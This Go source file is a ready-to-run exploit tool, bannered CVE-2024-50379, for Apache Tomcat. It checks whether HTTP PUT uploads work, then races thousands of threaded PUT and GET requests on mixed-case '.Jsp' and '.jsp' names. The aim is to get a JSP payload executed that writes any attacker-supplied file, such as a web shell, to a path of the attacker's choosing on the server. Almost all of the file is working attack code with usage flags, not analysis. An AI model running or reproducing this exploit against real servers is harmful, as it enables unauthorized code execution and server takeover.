package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"github.com/panjf2000/ants/v2"
	"github.com/valyala/fasthttp"
	"math/rand"
	"os"
	"strings"
	"sync"
	"time"
)

var banner = `   ______     _______     ____   ___ ____  _  _        ____   ___ __________ ___  
  / ___\ \   / / ____|   |___ \ / _ \___ \| || |      | ___| / _ \___ /___  / _ \ 
 | |    \ \ / /|  _| _____ __) | | | |__) | || |_ ____|___ \| | | ||_ \  / / (_) |
 | |___  \ V / | |__|_____/ __/| |_| / __/|__   _|_____|__) | |_| |__) |/ / \__, |
  \____|  \_/  |_____|   |_____|\___/_____|  |_|      |____/ \___/____//_/    /_/`

var defaultHeaders = map[string]string{
	"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36",
	"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"Accept-Language": "zh-CN,zh;q=0.9",
}

func SendReqNoRsp(url, body string, method string) {
	// 这里fasthttp有个坑，DefaultMaxConnsPerHost。把fasthttp拉下来改掉，不然线程拉不上去
	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	req.SetRequestURI(url)
	req.Header.SetMethod(method)
	req.SetBodyString(body)

	for key, value := range defaultHeaders {
		req.Header.Set(key, value)
	}

	for true {
		fasthttp.Do(req, nil)
	}
}

// SendRequest sends a PUT request with a custom body and path
func SendRequest(url, body string, method string) (int, string, error) {
	// Create a new request and response
	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseResponse(resp)

	// Set request method, URL, and body
	req.SetRequestURI(url)
	req.Header.SetMethod(method)
	req.SetBodyString(body)

	for key, value := range defaultHeaders {
		req.Header.Set(key, value)
	}

	// Send the request
	err := fasthttp.Do(req, resp)
	if err != nil {
		return 0, "", err
	}

	// Get the response status code and body
	statusCode := resp.StatusCode()
	responseBody := string(resp.Body())

	return statusCode, responseBody, nil
}

// GenerateRandomString 生成指定长度的随机大小写字母+数字字符串
func GenerateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var seededRand = rand.New(rand.NewSource(time.Now().UnixNano()))
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(result)
}

// CheckPut 是否能上传文件
func CheckPut(rootUrl string) bool {
	path := "/" + GenerateRandomString(8) + ".Jsp"
	body := GenerateRandomString(32)
	statusCode, _, err := SendRequest(rootUrl+path, body, fasthttp.MethodPut)
	if err != nil {
		fmt.Println("PUT没响应。寄了")
		return false
	}
	if statusCode != 201 && statusCode != 204 {
		return false
	}
	statusCode, rspBody, err := SendRequest(rootUrl+path, "", fasthttp.MethodGet)
	if err != nil {
		fmt.Println("GET寄了")
		return false
	}
	return strings.Contains(rspBody, body)
}

func main() {
	fmt.Println(banner)
	fmt.Println("  By: SleepingBag945\n")

	var uploadFile string
	flag.StringVar(&uploadFile, "f", "", "需要上传的文件")
	var path string
	flag.StringVar(&path, "p", "fuck.jsp", "上传至目标服务器的路径，如poc.jsp C:/1.txt")
	var accessPath string
	flag.StringVar(&accessPath, "ap", "", "上传至目标服务器后的访问路径，poc.jsp，若不指定则和与-p参数一致")
	var target string
	flag.StringVar(&target, "u", "", "url 不要带/后缀")
	var threads int
	flag.IntVar(&threads, "t", 2000, "线程")
	flag.Parse()

	if accessPath == "" {
		accessPath = path
	}

	if uploadFile == "" {
		fmt.Println("未指定需要上传的文件。。")
		os.Exit(0)
	}
	content, err := os.ReadFile(uploadFile)
	if err != nil {
		fmt.Println("读取不到需要上传的文件")
		os.Exit(0)
	}

	if !CheckPut(target) {
		fmt.Println("PUT功能失效，测试失败")
		os.Exit(0)
	}
	fmt.Println("PUT 功能正常，开始利用..")

	if threads < 500 {
		fmt.Println("线程过小，成功概率低...")
	}

	contentBase64 := base64.StdEncoding.EncodeToString(content)

	var payload strings.Builder
	payload.WriteString(`<%@ page import="java.util.Base64, java.io.FileOutputStream" %>
<%
    String content = "`)
	payload.WriteString(contentBase64)
	payload.WriteString(`";
    byte[] decodedBytes = Base64.getDecoder().decode(content);
    String decodedString = new String(decodedBytes, "UTF-8");
    String filePath = application.getRealPath("`)
	payload.WriteString(path)
	payload.WriteString(`");
    try (FileOutputStream fos = new FileOutputStream(filePath)) {
        fos.write(decodedString.getBytes("UTF-8"));
    }
%>`)

	expFileName := GenerateRandomString(8)

	scanPool, _ := ants.NewPoolWithFunc(threads, func(i interface{}) {
		if i.(int) == 1 {
			SendReqNoRsp(target+"/"+expFileName+"1.Jsp", payload.String(), fasthttp.MethodPut)
		} else if i.(int) == 2 {
			SendReqNoRsp(target+"/"+expFileName+"2.Jsp", payload.String(), fasthttp.MethodPut)
		} else if i.(int) == 0 {
			// 校验结果
			for true {
				time.Sleep(time.Millisecond * 500)
				status, _, err := SendRequest(target+"/"+accessPath, "", fasthttp.MethodGet)
				if err != nil {
					continue
				}
				if status == 200 {
					fmt.Println("利用成功:" + target + "/" + accessPath)
					os.Exit(0)
				}
			}

		} else {
			SendReqNoRsp(target+"/"+expFileName+"1.jsp", "", fasthttp.MethodGet)
		}
	}, ants.WithPanicHandler(func(err interface{}) {
	}))
	defer scanPool.Release()

	scanPool.Invoke(0)

	for i := 0; i < threads-42; i++ {
		scanPool.Invoke(3)
	}

	for i := 0; i < 20; i++ {
		scanPool.Invoke(1)
	}
	for i := 0; i < 20; i++ {
		scanPool.Invoke(2)
	}

	// 一个校验结果

	// 无限等待，直到成功
	var c sync.WaitGroup
	c.Add(1)
	c.Wait()
}
